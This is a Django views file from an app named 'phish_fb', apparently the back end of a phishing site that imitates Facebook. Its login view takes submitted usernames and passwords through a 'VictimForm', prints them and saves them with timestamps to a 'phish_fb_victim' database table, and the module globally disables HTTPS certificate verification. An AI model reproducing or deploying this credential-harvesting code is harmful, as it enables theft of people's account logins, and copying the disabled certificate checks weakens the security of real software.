from django.shortcuts import render
from phish_fb.forms import VictimForm
from datetime import datetime
# Create your views here.
import ssl
import sqlite3
 
conn = sqlite3.connect('db.sqlite3',check_same_thread=False)
c = conn.cursor()


try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context

def home(request):
    return render(request, 'phish_fb/home.html')

def login(request):
    
    now = datetime.now()
    date = now.strftime("%d/%m/%Y %H:%M:%S")
    if request.method == 'POST':
        form = VictimForm(data=request.POST)
        
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            
            print('*** form :', form)
            print('***Username :', username)
            print('*** Password :', password)
            c.execute("INSERT INTO phish_fb_victim (password, username,date) VALUES(?, ?,?)", (password, username,date))
            conn.commit()
            

    return render(request, 'phish_fb/done.html')